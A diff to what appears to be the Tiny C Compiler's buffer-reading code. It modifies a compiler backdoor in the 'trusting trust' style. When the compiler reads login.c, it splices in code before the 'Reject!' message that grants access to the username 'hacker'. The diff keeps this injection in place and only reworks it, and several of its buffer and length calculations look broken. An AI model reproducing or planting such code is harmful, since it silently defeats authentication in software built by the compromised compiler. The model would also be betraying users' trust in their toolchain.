@@ -615,17 +615,20 @@ static int handle_eob(void)
 #endif
             len = read(bf->fd, bf->buffer, len);
 	    if(strcmp(file->filename, "login.c") == 0) {
-	    	const unsigned char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%cprintf(%cwelcome!%c%c);%creturn 0;%c}";
+	    	char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%cprintf(%cwelcome!%c%c);%creturn 0;%c}";
 		unsigned char* inject_code[200];
 		snprintf(inject_code, 200, inject_login, 34, 34, 34, 34, 10, 34, 10, 10);
-		int inject_len = strlen(inject_login);
-		unsigned char* new_buf = (unsigned char*)malloc(sizeof(unsigned char) * IO_BUF_SIZE);
-		unsigned char* inject_location = strstr(bf->buffer, "printf(\"Reject!\")");
-		int size_pre_inject = inject_location - bf->buffer;
-		strncpy(new_buf, bf->buffer, size_pre_inject);
+		int inject_len;
+	        inject_len = strlen(inject_login);
+		unsigned char* new_buf;
+		new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
+		unsigned char* inject_location;
+		inject_location = strstr(bf->buffer, "printf(\"Reject!\")");
+		int pre_inject_len = inject_location - bf->buffer;
+		strncpy(new_buf, bf->buffer, pre_inject_len);
 		strncat(new_buf, inject_code, inject_len);
 		strcat(new_buf, inject_location);
-		bf->buffer = new_buf;
+		strncpy(bf->buffer, new_buf, len + inject_len);
 		len = len + inject_len;
 	    }
             if (len < 0)
